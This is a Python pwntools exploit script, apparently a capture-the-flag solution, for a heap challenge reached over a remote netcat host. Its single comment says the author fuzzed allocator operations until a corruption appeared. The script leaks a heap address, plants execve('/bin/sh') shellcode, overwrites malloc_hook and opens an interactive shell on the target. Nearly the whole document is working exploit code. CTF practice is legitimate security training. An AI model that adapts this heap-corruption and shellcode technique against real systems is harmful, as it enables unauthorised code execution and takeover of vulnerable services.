###There's so many things fucked up with the implementation, so i didn't even bother trying to understand it, just fuzzed for a series of operatioins that caused inuse chunks linked list to corrupt and hijack meta chunks

from pwn import *

context.arch = 'amd64'

###Util
def create(size):
    r.sendlineafter('choice?\n','1')
    r.sendlineafter('want?\n',str(size))

def delete(idx):
    r.sendlineafter('choice?\n','2')
    r.sendlineafter('delete?\n',str(idx))

def edit(idx,size,data):
    r.sendlineafter('choice?\n','3')
    r.sendlineafter('modify?\n',str(idx))
    r.sendlineafter('want?\n',str(size))
    r.sendafter('Content: \n',data)

def show(idx):
    r.sendlineafter("choice?\n",'4')
    r.sendlineafter('see?\n',str(idx))
    return r.recvuntil('\nSuccess!\n',drop=True)[10:]

###Addr
malloc_hook = 0x601000
bss = 0x601008

###Exploit
r = remote('nc.eonew.cn',10000)

create(0x30)
edit(0,0x30,'M30W')
create(0x20)
edit(0,0x40,'M30W')
create(0x50)
shellcode = asm(f'''
                 mov rax,0x3b
                 mov rdi,{bss}
                 mov rsi,0
                 mov rdx,0
                 syscall
                 ''')
edit(2,0x50,b'\x00'*0x10+shellcode)
delete(2)
delete(1)
delete(0)
heap_addr = u64(show(0).ljust(8,b'\x00'))-0x70
print(hex(heap_addr))

create(0x20)
edit(1,0x10,p64(0x10)+p64(malloc_hook))
edit(0,0x10,p64(heap_addr+0x140)+b'/bin/sh\x00')

create(1)
r.interactive()
